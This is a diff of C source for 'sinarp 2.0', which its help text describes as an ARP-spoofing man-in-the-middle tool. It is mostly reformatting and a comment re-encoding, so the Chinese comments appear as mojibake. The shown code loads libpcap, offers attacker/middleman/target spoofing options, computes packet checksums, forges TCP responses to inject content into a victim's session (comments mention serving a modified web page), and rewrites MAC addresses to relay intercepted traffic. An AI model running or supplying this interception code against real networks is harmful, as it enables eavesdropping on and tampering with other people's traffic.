+    pf_pcap_breakloop = (void ( *)(pcap_t *))dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_breakloop");
+    pf_pcap_compile = (int ( *)(pcap_t *, struct bpf_program *, const char *, int, bpf_u_int32))dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_compile");
+    pf_pcap_setfilter = (int ( *)(pcap_t *, struct bpf_program *)) dlsym(dlopen("libpcap.so", RTLD_LAZY), "pcap_setfilter");
+    if (!(pf_pcap_perror &&
+            pf_pcap_sendpacket &&
+            pf_pcap_next_ex &&
+            pf_pcap_freealldevs &&
+            pf_pcap_close &&
+            pf_pcap_breakloop &&
+            pf_pcap_open_live &&
+            pf_pcap_findalldevs &&
+            pf_pcap_breakloop &&
+            pf_pcap_compile &&
+            pf_pcap_setfilter))
     {
         return FALSE;
     }
@@ -466,227 +461,231 @@ BOOL sinarp_init_pcap_funcs()
 void sinarp_copyright_msg()
 {
     printf(\
-        "sinarp 2.0\n"
-        //"»ùÓÚARPÆÛÆ­µÄÖĞ¼äÈË¹¥»÷¹¤¾ß\n"
-        "By:sincoder\nBlog:www.sincoder.com\nEmail:2bcoder@gmail.com\n");
+           "sinarp 2.0\n"
+           //"åŸºäºARPæ¬ºéª—çš„ä¸­é—´äººæ”»å‡»å·¥å…·\n"
+           "By:sincoder\nBlog:www.sincoder.com\nEmail:2bcoder@gmail.com\n");
 }
 
 void sinarp_show_help_msg()
 {
-    sinarp_printf("Usage:sinarp [OPTIONS]\n" 
-        "\t-i [network interface id]\n" 
-        "\t-A [Target A]\n"
-        "\t-M [Middleman's ip,if the NIC has multiple Ip ,you need to specify one]\n"
-        "\t-B [Target B]\n"
-        "\t-s [0|1] spoof type 0: A --> M --> B 1:  A <--> M <--> B\n"
-        "\t-p [Name of the plug-ins to be loaded, split multiple plugin use ',']\n"
-        "\t-t [Time between echo spoof packet , in ms, default is 10000ms]\n"
-        "\t-f [Close ip forwarding]\n");
+    sinarp_printf("Usage:sinarp [OPTIONS]\n"
+                  "\t-i [network interface id]\n"
+                  "\t-A [Target A]\n"
+                  "\t-M [Middleman's ip,if the adapter has multiple ip ,you need to specify one]\n"
+                  "\t-B [Target B]\n"
+                  "\t-s [0|1|2] spoof type 0: A --> M --> B 1:  A <--> M <--> B 2: no arp spoof \n"
+                  "\t-p [Name of the plug-ins to be loaded, split multiple plugin use ',']\n"
+                  "\t-t [Time between echo spoof packet , in ms, default is 10000ms]\n"
+                  "\t-f [Close ip forwarding]\n"
+                  "\t--mac [ip1:mac1,ip2:mac2] special the mac of the ip \n");
 }
 /*
 void sinarp_show_help_msg()
 {
-sinarp_printf("Usage:sinarp [Ñ¡Ïî]\n" 
-"\t-i [Íø¿¨id]\n" 
-"\t-A [AÀàÖ÷»úÁĞ±í,Ä¬ÈÏÎªÍø¹Ø]\n"
-"\t-M [ÖĞ¼äÈËip,Èç¹ûÍø¿¨ÉÏÓĞ¶à¸öIpµÄ»°¾ÍĞèÒªÖ¸¶¨Ò»¸öip£¬Ä¬ÈÏÊ¹ÓÃÖ¸¶¨Íø¿¨µÄµÚÒ»¸öip]\n"
-"\t-B [BÀàÖ÷»úÁĞ±í]\n"
-"\t-s [0|1] ÆÛÆ­ÀàĞÍ 0:µ¥ÏòÆÛÆ­ A --> M --> B 1:Ë«ÏòÆÛÆ­  A <--> M <--> B\n"
-"\t-p [Òª¼ÓÔØµÄ²å¼şÃû³Æ,¶à¸ö²å¼şÖ®¼äÒÔ',' ·Ö¸î]\n"
-"\t-t [ÆÛÆ­Êı¾İ°üµÄ¼ä¸ôÊ±¼ä,µ¥Î»ms,Ä¬ÈÏÎª10000ms]\n");
+sinarp_printf("Usage:sinarp [é€‰é¡¹]\n"
+"\t-i [ç½‘å¡id]\n"
+"\t-A [Aç±»ä¸»æœºåˆ—è¡¨,é»˜è®¤ä¸ºç½‘å…³]\n"
+"\t-M [ä¸­é—´äººip,å¦‚æœç½‘å¡ä¸Šæœ‰å¤šä¸ªIpçš„è¯å°±éœ€è¦æŒ‡å®šä¸€ä¸ªipï¼Œé»˜è®¤ä½¿ç”¨æŒ‡å®šç½‘å¡çš„ç¬¬ä¸€ä¸ªip]\n"
+"\t-B [Bç±»ä¸»æœºåˆ—è¡¨]\n"
+"\t-s [0|1] æ¬ºéª—ç±»å‹ 0:å•å‘æ¬ºéª— A --> M --> B 1:åŒå‘æ¬ºéª—  A <--> M <--> B\n"
+"\t-p [è¦åŠ è½½çš„æ’ä»¶åç§°,å¤šä¸ªæ’ä»¶ä¹‹é—´ä»¥',' åˆ†å‰²]\n"
+"\t-t [æ¬ºéª—æ•°æ®åŒ…çš„é—´éš”æ—¶é—´,å•ä½ms,é»˜è®¤ä¸º10000ms]\n");
 }
 */
-//¼ÆËãĞ§ÑéºÍº¯Êı£¬ÏÈ°ÑIPÊ×²¿µÄĞ§ÑéºÍ×Ö¶ÎÉèÎª0(IP_HEADER.checksum=0)
-//È»ºó¼ÆËãÕû¸öIPÊ×²¿µÄ¶ş½øÖÆ·´ÂëµÄºÍ¡£
+//è®¡ç®—æ•ˆéªŒå’Œå‡½æ•°ï¼Œå…ˆæŠŠIPé¦–éƒ¨çš„æ•ˆéªŒå’Œå­—æ®µè®¾ä¸º0(IP_HEADER.checksum=0)
+//ç„¶åè®¡ç®—æ•´ä¸ªIPé¦–éƒ¨çš„äºŒè¿›åˆ¶åç çš„å’Œã€‚
 uint16 checksum(uint16 *buffer, int size)
 {
-    unsigned long cksum=0;
-    while (size >1) {
-        cksum+=*buffer++;
-        size-=sizeof(uint16);
+    unsigned long cksum = 0;
+    while (size > 1)
+    {
+        cksum += *buffer++;
+        size -= sizeof(uint16);
     }
-    if (size) cksum += *(uint8*) buffer;
-    cksum = (cksum >> 16) + (cksum&0xffff);
+    if (size) cksum += *(uint8 *) buffer;
+    cksum = (cksum >> 16) + (cksum & 0xffff);
     cksum += (cksum >> 16);
-    return (uint16) (~cksum); 
+    return (uint16) (~cksum);
 }
 
 unsigned long cksum1(unsigned long cksum, uint16 *buffer, int size)
 {
-    while (size >1) {
-        cksum+=*buffer++;
-        size-=sizeof(uint16);
+    while (size > 1)
+    {
+        cksum += *buffer++;
+        size -= sizeof(uint16);
     }
-    if (size) cksum += *(uint8*) buffer;
+    if (size) cksum += *(uint8 *) buffer;
 
-    return (cksum); 
+    return (cksum);
 }
 
 uint16 cksum2(unsigned long cksum)
 {
 
-    cksum = (cksum >> 16) + (cksum&0xffff);
+    cksum = (cksum >> 16) + (cksum & 0xffff);
     cksum += (cksum >> 16);
-    return (uint16) (~cksum); 
+    return (uint16) (~cksum);
 }
 //
-// ¼ÆËãtcp udp¼ìÑéºÍµÄº¯Êı
-// 
+// è®¡ç®—tcp udpæ£€éªŒå’Œçš„å‡½æ•°
+//
 void  sinarp_checksum(IPHeader *pIphdr)
 {
     PSD psd;
     u_int i;
-    unsigned long	_sum = 0;
+    unsigned long   _sum = 0;
     IPHeader  *ih;
     TCPHeader *th;
     UDPHEADER *uh;
-    u_int ip_len=0, pro_len=0, data_len=0;
+    u_int ip_len = 0, pro_len = 0, data_len = 0;
     unsigned char *data_offset;
 
-    // ÕÒµ½IPÍ·µÄÎ»ÖÃºÍµÃµ½IPÍ·µÄ³¤¶È
+    // æ‰¾åˆ°IPå¤´çš„ä½ç½®å’Œå¾—åˆ°IPå¤´çš„é•¿åº¦
     ih = pIphdr;
     ip_len = (ih->iphVerLen & 0xf) * sizeof(unsigned long);
-    if(ih->ipProtocol == PROTO_TCP)
+    if (ih->ipProtocol == PROTO_TCP)
     {
-        // ÕÒµ½TCPµÄÎ»ÖÃ
-        th = (TCPHeader *) ((u_char*)ih + ip_len);
-        pro_len = ((th->dataoffset>>4)*sizeof(unsigned long));
+        // æ‰¾åˆ°TCPçš„ä½ç½®
+        th = (TCPHeader *) ((u_char *)ih + ip_len);
+        pro_len = ((th->dataoffset >> 4) * sizeof(unsigned long));
         th->checksum = 0;
     }
-    else if(ih->ipProtocol == PROTO_UDP)
+    else if (ih->ipProtocol == PROTO_UDP)
     {
-        // ÕÒµ½UDPµÄÎ»ÖÃ
-        uh = (UDPHEADER *) ((u_char*)ih + ip_len);
+        // æ‰¾åˆ°UDPçš„ä½ç½®
+        uh = (UDPHEADER *) ((u_char *)ih + ip_len);
         pro_len = sizeof(UDPHEADER);
         uh->uh_sum = 0;
     }
-    // Êı¾İ³¤¶È
+    // æ•°æ®é•¿åº¦
     data_len = ntohs(ih->ipLength) - (ip_len + pro_len);
-    // Êı¾İÆ«ÒÆÖ¸Õë
+    // æ•°æ®åç§»æŒ‡é’ˆ
     data_offset = (unsigned char *)ih + ip_len + pro_len;
 
-    // Î±Í·
-    // °üº¬Ô´IPµØÖ·ºÍÄ¿µÄIPµØÖ·
+    // ä¼ªå¤´
+    // åŒ…å«æºIPåœ°å€å’Œç›®çš„IPåœ°å€
     psd.saddr = ih->ipSource;
     psd.daddr = ih->ipDestination;
 
-    // °üº¬8Î»0Óò
+    // åŒ…å«8ä½0åŸŸ
 
     psd.mbz = 0;
 
-    // Ğ­Òé
+    // åè®®
     psd.ptcl = ih->ipProtocol;
 
-    // ³¤¶È
+    // é•¿åº¦
     psd.udpl = htons(pro_len + data_len);
 
-    // ²¹Æëµ½ÏÂÒ»¸ö16Î»±ß½ç
-    for(i=0; i < data_len % 2; i++)
+    // è¡¥é½åˆ°ä¸‹ä¸€ä¸ª16ä½è¾¹ç•Œ
+    for (i = 0; i < data_len % 2; i++)
     {
         data_offset[data_len] = 0;
         data_len++;
     }
     ih->ipChecksum = 0;
-    ih->ipChecksum = checksum((uint16*)ih, ip_len);
-    _sum = cksum1(0, (uint16*)&psd, sizeof(PSD));
-    _sum = cksum1(_sum, (uint16*)((u_char*)ih + ip_len), pro_len);
-    _sum = cksum1(_sum, (uint16*)data_offset, data_len);
+    ih->ipChecksum = checksum((uint16 *)ih, ip_len);
+    _sum = cksum1(0, (uint16 *)&psd, sizeof(PSD));
+    _sum = cksum1(_sum, (uint16 *)((u_char *)ih + ip_len), pro_len);
+    _sum = cksum1(_sum, (uint16 *)data_offset, data_len);
     _sum = cksum2(_sum);
 
-    // ¼ÆËãÕâ¸öĞ£ÑéºÍ£¬½«½á¹ûÌî³äµ½Ğ­ÒéÍ·
-    if(ih->ipProtocol == PROTO_TCP)
+    // è®¡ç®—è¿™ä¸ªæ ¡éªŒå’Œï¼Œå°†ç»“æœå¡«å……åˆ°åè®®å¤´
+    if (ih->ipProtocol == PROTO_TCP)
         th->checksum = (uint16)_sum;
-    else if(ih->ipProtocol == PROTO_UDP)
+    else if (ih->ipProtocol == PROTO_UDP)
         uh->uh_sum = (uint16)_sum;
-    else 
+    else
         return;
 }
 
-// from NetFuke Source 
-// ÄÚ´æÆ¥Åäº¯Êımemfind
-// »ùÓÚBMËã·¨
-// ×÷Õß:ÖÜÁØ KCN
+// from NetFuke Source
+// å†…å­˜åŒ¹é…å‡½æ•°memfind
+// åŸºäºBMç®—æ³•
+// ä½œè€…:å‘¨éœ– KCN
 // modified by shadow @2007/03/18
-void*  sinarp_memfind( const void*		in_block,		/* Êı¾İ¿é */
-    const size_t	block_size,		/* Êı¾İ¿é³¤¶È */
-    const void*		in_pattern,		/* ĞèÒª²éÕÒµÄÊı¾İ */
-    const size_t	pattern_size,	/* ²éÕÒÊı¾İµÄ³¤¶È */
-    size_t*			shift_table,	/* ÒÆÎ»±í£¬Ó¦¸ÃÊÇ256*size_tµÄÊı×é */
-    BOOL			b_init )		/* ÊÇ·ñĞèÒª³õÊ¼»¯ÒÆÎ»±í */
+void  *sinarp_memfind( const void      *in_block,       /* æ•°æ®å— */
+                       const size_t    block_size,     /* æ•°æ®å—é•¿åº¦ */
+                       const void     *in_pattern,     /* éœ€è¦æŸ¥æ‰¾çš„æ•°æ® */
+                       const size_t    pattern_size,   /* æŸ¥æ‰¾æ•°æ®çš„é•¿åº¦ */
+                       size_t         *shift_table,    /* ç§»ä½è¡¨ï¼Œåº”è¯¥æ˜¯256*size_tçš„æ•°ç»„ */
+                       BOOL            b_init )        /* æ˜¯å¦éœ€è¦åˆå§‹åŒ–ç§»ä½è¡¨ */
 {
-    size_t	i4_index	= 0;	// ×Ö½ÚÆ«ÒÆÁ¿
-    size_t	i4_matchlen	= 0;	// Æ¥ÅäÁËµÄ³¤¶È
-    size_t	i4_limit	= 0;	// ¿ÉËÑË÷µÄ×î´ó³¤¶È
+    size_t  i4_index    = 0;    // å­—èŠ‚åç§»é‡
+    size_t  i4_matchlen = 0;    // åŒ¹é…äº†çš„é•¿åº¦
+    size_t  i4_limit    = 0;    // å¯æœç´¢çš„æœ€å¤§é•¿åº¦
 
-    const unsigned char*	p_match		= NULL;		// Æ¥Åä¿ªÊ¼Ö¸Õë
-    const unsigned char*	p_block		= (unsigned char *) in_block;	// ËÑË÷Ö¸Õë
-    const unsigned char*	p_pattern	= (unsigned char *) in_pattern;	// Æ¥ÅäÖ¸Õë
+    const unsigned char    *p_match     = NULL;     // åŒ¹é…å¼€å§‹æŒ‡é’ˆ
+    const unsigned char    *p_block     = (unsigned char *) in_block;   // æœç´¢æŒ‡é’ˆ
+    const unsigned char    *p_pattern   = (unsigned char *) in_pattern; // åŒ¹é…æŒ‡é’ˆ
 
-    // ¼ì²é
-    if( ( NULL == p_block ) ||
-        ( NULL == p_pattern ) ||
-        ( block_size < pattern_size ) ||
-        ( ( b_init == FALSE ) && ( shift_table == NULL ) ) )
+    // æ£€æŸ¥
+    if ( ( NULL == p_block ) ||
+            ( NULL == p_pattern ) ||
+            ( block_size < pattern_size ) ||
+            ( ( b_init == FALSE ) && ( shift_table == NULL ) ) )
 
     {
         return NULL;
     }
 
-    // ¿Õ´®Æ¥ÅäµÚÒ»¸ö
-    if( 0 >= pattern_size )
+    // ç©ºä¸²åŒ¹é…ç¬¬ä¸€ä¸ª
+    if ( 0 >= pattern_size )
     {
         return ( (void *)p_block );
     }
 
-    // Èç¹ûÃ»ÓĞ³õÊ¼»¯ÒÆÎ»±í£¬¹¹ÔìÒÆÎ»±í
-    if( b_init )
+    // å¦‚æœæ²¡æœ‰åˆå§‹åŒ–ç§»ä½è¡¨ï¼Œæ„é€ ç§»ä½è¡¨
+    if ( b_init )
     {
-        // ÉêÇëÒÆÎ»±í¿Õ¼ä
-        shift_table = (size_t*)malloc(256*sizeof(size_t));
+        // ç”³è¯·ç§»ä½è¡¨ç©ºé—´
+        shift_table = (size_t *)malloc(256 * sizeof(size_t));
 
-        // ³õÊ¼»¯ÒÆÎ»Æ«ÒÆÁ¿
-        for( i4_index = 0; i4_index < 256; ++i4_index )
+        // åˆå§‹åŒ–ç§»ä½åç§»é‡
+        for ( i4_index = 0; i4_index < 256; ++i4_index )
         {
             shift_table[i4_index] = pattern_size + 1;
         }
 
-        // ÊµÀı»¯³öÏÖ×Ö·ûµÄÆ«ÒÆÁ¿
-        for( i4_index = 0; i4_index < pattern_size; ++i4_index )
+        // å®ä¾‹åŒ–å‡ºç°å­—ç¬¦çš„åç§»é‡
+        for ( i4_index = 0; i4_index < pattern_size; ++i4_index )
         {
             shift_table[(unsigned char)p_pattern[i4_index]] = pattern_size - i4_index;
         }
     }
 
-    // Êµ¼ÊĞèÒªËÑË÷µÄ×î´ó³¤¶È
+    // å®é™…éœ€è¦æœç´¢çš„æœ€å¤§é•¿åº¦
     i4_limit = block_size - pattern_size + 1;
 
-    // ¿ªÊ¼ËÑË÷Êı¾İ¿é£¬Ã¿´ÎÇ°½øÒÆÎ»±íÖĞµÄÊıÁ¿
-    for(	i4_index = 0;
-        i4_index < i4_limit;
-        i4_index += shift_table[(unsigned char)p_block[i4_index + pattern_size]] )
+    // å¼€å§‹æœç´¢æ•°æ®å—ï¼Œæ¯æ¬¡å‰è¿›ç§»ä½è¡¨ä¸­çš„æ•°é‡
+    for (    i4_index = 0;
+             i4_index < i4_limit;
+             i4_index += shift_table[(unsigned char)p_block[i4_index + pattern_size]] )
     {
-        // Èç¹ûµÚÒ»¸ö×Ö½ÚÆ¥Åä£¬ÄÇÃ´¼ÌĞøÆ¥ÅäÊ£ÏÂµÄ
-        if( p_block[i4_index] == *p_pattern )
+        // å¦‚æœç¬¬ä¸€ä¸ªå­—èŠ‚åŒ¹é…ï¼Œé‚£ä¹ˆç»§ç»­åŒ¹é…å‰©ä¸‹çš„
+        if ( p_block[i4_index] == *p_pattern )
         {
-            p_match		= p_block + i4_index + 1;
-            i4_matchlen	= 1;
+            p_match     = p_block + i4_index + 1;
+            i4_matchlen = 1;
 
             do
             {
-                // Æ¥ÅäÂú×ã
-                if( i4_matchlen == pattern_size )
+                // åŒ¹é…æ»¡è¶³
+                if ( i4_matchlen == pattern_size )
                 {
-                    if( b_init )
+                    if ( b_init )
                     {
                         free(shift_table);
                     }
-                    return (void*)( p_block + i4_index );
+                    return (void *)( p_block + i4_index );
                 }
-            }while( *p_match++ == p_pattern[i4_matchlen++] );
+            }
+            while ( *p_match++ == p_pattern[i4_matchlen++] );
         }
     }
 
-    if( b_init )
+    if ( b_init )
     {
         free(shift_table);
     }
@@ -695,20 +694,20 @@ void*  sinarp_memfind( const void*		in_block,		/* Êı¾İ¿é */
 }
 
 /*
-ĞŞ¸ÄÍøÒ³  ·µ»ØÒ»¸ö ÎÒÃÇ×Ô¼ºĞŞ¸ÄµÄ°ü ¸øÇëÇó·½ È»ºó°ÑÕâ¸öÕæÊµµÄ°ü Òª²»ÒªÔÙ·¢¸øÕæÊµµÄ ·şÎñÆ÷ÄØ ½ñÍí»ØÈ¥×¥°üÇÆÇÆ¡£¡£
-·µ»ØÒ»¶Î js À´¼ÓÔØÕæÊµµÄÍøÒ³ 
+ä¿®æ”¹ç½‘é¡µ  è¿”å›ä¸€ä¸ª æˆ‘ä»¬è‡ªå·±ä¿®æ”¹çš„åŒ… ç»™è¯·æ±‚æ–¹ ç„¶åæŠŠè¿™ä¸ªçœŸå®çš„åŒ… è¦ä¸è¦å†å‘ç»™çœŸå®çš„ æœåŠ¡å™¨å‘¢ ä»Šæ™šå›å»æŠ“åŒ…ç§ç§ã€‚ã€‚
+è¿”å›ä¸€æ®µ js æ¥åŠ è½½çœŸå®çš„ç½‘é¡µ
 */
 /*
-·µ»Ø TRUE ËµÃ÷Õâ¸ö°üĞèÒª±»×ª·¢³öÈ¥  FALSE µÄ»° ËµÃ÷ÎÒÃÇ×Ô¼ºÒÑ¾­´¦ÀíÕâ¸ö°üÁË¡£
+è¿”å› TRUE è¯´æ˜è¿™ä¸ªåŒ…éœ€è¦è¢«è½¬å‘å‡ºå»  FALSE çš„è¯ è¯´æ˜æˆ‘ä»¬è‡ªå·±å·²ç»å¤„ç†è¿™ä¸ªåŒ…äº†ã€‚
 */
 
 
 /*
-ÓÉ´«ÈëµÄÊı¾İ°ü À´½¨Á¢Ò»¸ö·µ»Ø°ü ¡£
-IN ethdr ´«ÈëµÄÇëÇó°ü
+ç”±ä¼ å…¥çš„æ•°æ®åŒ… æ¥å»ºç«‹ä¸€ä¸ªè¿”å›åŒ… ã€‚
+IN ethdr ä¼ å…¥çš„è¯·æ±‚åŒ…
 
 */
-BOOL  sinarp_build_tcp_response_packet(ETHeader *ethdr,uint8 *packet,uint32 * psize,uint8 *data,uint32 size)
+BOOL  sinarp_build_tcp_response_packet(ETHeader *ethdr, uint8 *packet, uint32 *psize, uint8 *data, uint32 size)
 {
     IPHeader *in_iphdr = NULL;
     ETHeader *my_ethdr = (ETHeader *)packet;
@@ -717,129 +716,131 @@ BOOL  sinarp_build_tcp_response_packet(ETHeader *ethdr,uint8 *packet,uint32 * ps
     TCPHeader *in_tcphdr = NULL;
     uint32 ip_len;
     uint32 in_data_len;
-    memcpy(my_ethdr->dhost,ethdr->shost,6);
-    memcpy(my_ethdr->shost,ethdr->dhost,6);
+    memcpy(my_ethdr->dhost, ethdr->shost, 6);
+    memcpy(my_ethdr->shost, ethdr->dhost, 6);
     my_ethdr->type = ethdr->type;
-    my_iphdr = (IPHeader *)((uint8 *)my_ethdr+14);
-    in_iphdr = (IPHeader *)((uint8 *)ethdr+14);
-    //¿½±´Ô­ Ip Í· È»ºó¸ÄĞ´ĞèÒª¸ÄĞ´µÄ×Ö¶Î
-    memcpy(my_iphdr,in_iphdr,sizeof(IPHeader)+sizeof(TCPHeader));
+    my_iphdr = (IPHeader *)((uint8 *)my_ethdr + 14);
+    in_iphdr = (IPHeader *)((uint8 *)ethdr + 14);
+    //æ‹·è´åŸ Ip å¤´ ç„¶åæ”¹å†™éœ€è¦æ”¹å†™çš„å­—æ®µ
+    memcpy(my_iphdr, in_iphdr, sizeof(IPHeader) + sizeof(TCPHeader));
     my_iphdr->ipSource = in_iphdr->ipDestination;
     my_iphdr->ipDestination = in_iphdr->ipSource;
     ip_len = (my_iphdr->iphVerLen & 0xf) * sizeof(unsigned long);
-    my_tcphdr = (TCPHeader *) ((u_char*)my_iphdr + ip_len);
-    in_tcphdr = (TCPHeader *)((u_char*)in_iphdr + ip_len);
-    my_iphdr->ipLength = htons(ip_len + ((my_tcphdr->dataoffset>>4)*sizeof(unsigned long)) + size);
-    in_data_len = ntohs(in_iphdr->ipLength) - (ip_len + ((my_tcphdr->dataoffset>>4)*sizeof(unsigned long))); //½ÓÊÕµ½µÄÊı¾İ³¤¶È
+    my_tcphdr = (TCPHeader *) ((u_char *)my_iphdr + ip_len);
+    in_tcphdr = (TCPHeader *)((u_char *)in_iphdr + ip_len);
+    my_iphdr->ipLength = htons(ip_len + ((my_tcphdr->dataoffset >> 4) * sizeof(unsigned long)) + size);
+    in_data_len = ntohs(in_iphdr->ipLength) - (ip_len + ((my_tcphdr->dataoffset >> 4) * sizeof(unsigned long))); //æ¥æ”¶åˆ°çš„æ•°æ®é•¿åº¦
     my_tcphdr->acknowledgeNumber = htonl(ntohl(in_tcphdr->sequenceNumber) + in_data_len);
     my_tcphdr->sequenceNumber = in_tcphdr->acknowledgeNumber;
     my_tcphdr->sourcePort = in_tcphdr->destinationPort;
     my_tcphdr->destinationPort = in_tcphdr->sourcePort;
-    my_tcphdr->flags = 0x08 | 0x10 |0x01; // PSH + ACK + FIN ·¢³ö¶Ï¿ªÁ¬½ÓµÄ±êÊ¶ ÒòÎªºóĞøµÄºÍÕæÊµÖ÷»úµÄÍ¨ĞÅ ±ØÈ»»á·¢ËÍTCPĞòÁĞ³ö´í
-    memcpy((uint8 *)my_iphdr + ip_len + ((my_tcphdr->dataoffset>>4)*sizeof(unsigned long)),data,size);
+    my_tcphdr->flags = 0x08 | 0x10 | 0x01; // PSH + ACK + FIN å‘å‡ºæ–­å¼€è¿æ¥çš„æ ‡è¯† å› ä¸ºåç»­çš„å’ŒçœŸå®ä¸»æœºçš„é€šä¿¡ å¿…ç„¶ä¼šå‘é€TCPåºåˆ—å‡ºé”™
+    memcpy((uint8 *)my_iphdr + ip_len + ((my_tcphdr->dataoffset >> 4)*sizeof(unsigned long)), data, size);
     sinarp_checksum(my_iphdr);
     *psize = 14 + ntohs(my_iphdr->ipLength);
     return TRUE;
 }
 
-char * sinarp_get_mac_by_ip(uint32 ip)
+char *sinarp_get_mac_by_ip(uint32 ip)
 {
-    if(g_HostList[ip >> 24].active = 1)
+    if (1 == g_HostList[ip >> 24].active)
     {
         return (char *)&g_HostList[ip >> 24].mac[0];
     }
     return NULL;
 }
 
-//ĞŞÕı°üµÄmacµØÖ· ÓÃÓÚ×ª·¢
+//ä¿®æ­£åŒ…çš„macåœ°å€ ç”¨äºè½¬å‘
 void  sinarp_forward_fix_packet(ETHeader *packet)
 {
-    IPHeader *ih = (IPHeader *) ((u_char*)packet + 14); //14ÎªÒÔÌ«Í·µÄ³¤¶È
+    IPHeader *ih = (IPHeader *) ((u_char *)packet + 14); //14ä¸ºä»¥å¤ªå¤´çš„é•¿åº¦
     /*
-    ĞŞ¸ÄÁËÊı¾İ°ü ±ØĞë±£Ö¤°ü»¹ÊÇÕıÈ·µÄ
+    ä¿®æ”¹äº†æ•°æ®åŒ… å¿…é¡»ä¿è¯åŒ…è¿˜æ˜¯æ­£ç¡®çš„
     */
-    // ×ª·¢Êı¾İ°ü 
-    memcpy(packet->shost,packet->dhost,6);//Òª¸ü¸ÄÔ´µØÖ·Îª ÖĞ¼äÈËµÄµØÖ· ²»È» »áÖØ¸´²¶»ñµ½°ü ¡­¡­
+    // è½¬å‘æ•°æ®åŒ…
+    memcpy(packet->shost, packet->dhost, 6); //è¦æ›´æ”¹æºåœ°å€ä¸º ä¸­é—´äººçš„åœ°å€ ä¸ç„¶ ä¼šé‡å¤æ•è·åˆ°åŒ… â€¦â€¦
     /*
-    ¸ù¾İÄ¿µÄµØÖ·À´µÃµ½ mac µÄ·½Ê½²»¿É¿¿  ÒòÎªÄ¿µÄµØÖ·¿ÉÄÜÊÇÍâÍøµÄ ´ËÊ±ÎÒÃÇÒª·¢¸øÍø¹Ø
-    Êı¾İ°ü×ª·¢Ïà¹Ø£º
-    IP °üÖĞ µÄ Ä¿±êºÍ Ô´ IP Èç¹ûÁ½¸ö¶¼ÊÇÄÚÍøµÄ ÄÇÃ´ËµÃ÷ÊÇÄÚÍøÖĞµÄÁ½Ì¨Ö÷»úÍ¨Ñ¶ ´ËÊ±Ö±½ÓÓÉ ip µÃµ½¶ÔÓ¦µÄ mac µØÖ·¾ÍĞĞÁË¡£
-    Èç¹ûÆäÖĞÒ»¸ö²»ÊÇµÄÄÚÍøµÄ ËµÃ÷ÊÇÄÚÍøºÍÍâÍøÖ®¼äÍ¨Ñ¶µÄ ÄÇÃ´Íø¹Ø²ÎÓëÆäÖĞÁË ´ËÊ±ÓÉÄÚÍøµÄ ip ¿ÉÒÔµÃµ½Æä mac µØÖ· 
-    ÄÚÍø·¢ËÍµ½ÍâÍø Ô´ ip µØÖ·ÊÇÄÚÍøµÄ Ä¿±êÊÇÍâÍøµÄ ÄÇÃ´ Ìæ»» Ä¿±êMACµØÖ·ÎªÍø¹ØµÄ Ô´MACÎª×Ô¼ºµÄ Ô´ipÒ²Îª×Ô¼ºµÄ
-    ÍâÍø·¢ËÍµ½ÄÚÍø Ô´ ip ÊÇÍâÍøµÄ Ä¿±êÊÇÄÚÍøµÄ Ìæ»»Ä¿±ê mac ÎªipµÄmac Ô´MAC Îª×Ô¼º 
-    2¸öip ¶¼ÊÇÍâÍøµÄ ÕâÖÖÇé¿ö ²»¿ÉÄÜ
+    æ ¹æ®ç›®çš„åœ°å€æ¥å¾—åˆ° mac çš„æ–¹å¼ä¸å¯é   å› ä¸ºç›®çš„åœ°å€å¯èƒ½æ˜¯å¤–ç½‘çš„ æ­¤æ—¶æˆ‘ä»¬è¦å‘ç»™ç½‘å…³
+    æ•°æ®åŒ…è½¬å‘ç›¸å…³ï¼š
+    IP åŒ…ä¸­ çš„ ç›®æ ‡å’Œ æº IP å¦‚æœä¸¤ä¸ªéƒ½æ˜¯å†…ç½‘çš„ é‚£ä¹ˆè¯´æ˜æ˜¯å†…ç½‘ä¸­çš„ä¸¤å°ä¸»æœºé€šè®¯ æ­¤æ—¶ç›´æ¥ç”± ip å¾—åˆ°å¯¹åº”çš„ mac åœ°å€å°±è¡Œäº†ã€‚
+    å¦‚æœå…¶ä¸­ä¸€ä¸ªä¸æ˜¯çš„å†…ç½‘çš„ è¯´æ˜æ˜¯å†…ç½‘å’Œå¤–ç½‘ä¹‹é—´é€šè®¯çš„ é‚£ä¹ˆç½‘å…³å‚ä¸å…¶ä¸­äº† æ­¤æ—¶ç”±å†…ç½‘çš„ ip å¯ä»¥å¾—åˆ°å…¶ mac åœ°å€
+    å†…ç½‘å‘é€åˆ°å¤–ç½‘ æº ip åœ°å€æ˜¯å†…ç½‘çš„ ç›®æ ‡æ˜¯å¤–ç½‘çš„ é‚£ä¹ˆ æ›¿æ¢ ç›®æ ‡MACåœ°å€ä¸ºç½‘å…³çš„ æºMACä¸ºè‡ªå·±çš„ æºipä¹Ÿä¸ºè‡ªå·±çš„
+    å¤–ç½‘å‘é€åˆ°å†…ç½‘ æº ip æ˜¯å¤–ç½‘çš„ ç›®æ ‡æ˜¯å†…ç½‘çš„ æ›¿æ¢ç›®æ ‡ mac ä¸ºipçš„mac æºMAC ä¸ºè‡ªå·±
+    2ä¸ªip éƒ½æ˜¯å¤–ç½‘çš„ è¿™ç§æƒ…å†µ ä¸å¯èƒ½
     */
-    if(((g_my_ip & 0x00FFFFFF) ^ (ih->ipDestination & 0x00FFFFFF)) == 0)
+    if (((g_my_ip & 0x00FFFFFF) ^ (ih->ipDestination & 0x00FFFFFF)) == 0)
     {
-        //Èç¹ûÄ¿±ê ip ÔÚÄÚÍø
-        memcpy(packet->dhost,g_HostList[ih->ipDestination >> 24].mac,6); //Ìæ»»Ä¿±ê mac ÎªÕıÈ·µÄ mac
+        //å¦‚æœç›®æ ‡ ip åœ¨å†…ç½‘
+        memcpy(packet->dhost, g_HostList[ih->ipDestination >> 24].mac, 6); //æ›¿æ¢ç›®æ ‡ mac ä¸ºæ­£ç¡®çš„ mac
     }
     else
     {
-        // Ä¿±êÊÇÍâÍøµÄ ÄÇÃ´Ô´ip¿Ï¶¨ÔÚÄÚÍøÁË
-        memcpy(packet->dhost,g_HostList[g_my_gw_addr >> 24].mac,6); //Ìæ»»Ä¿±ê mac ÎªÍø¹ØµÄ mac
+        // ç›®æ ‡æ˜¯å¤–ç½‘çš„ é‚£ä¹ˆæºipè‚¯å®šåœ¨å†…ç½‘äº†
+        memcpy(packet->dhost, g_HostList[g_my_gw_addr >> 24].mac, 6); //æ›¿æ¢ç›®æ ‡ mac ä¸ºç½‘å…³çš„ mac
     }
 }
 
-void   sinarp_packet_handler(u_char *param, const struct pcap_pkthdr *header, 
-    const u_char *pkt_data)
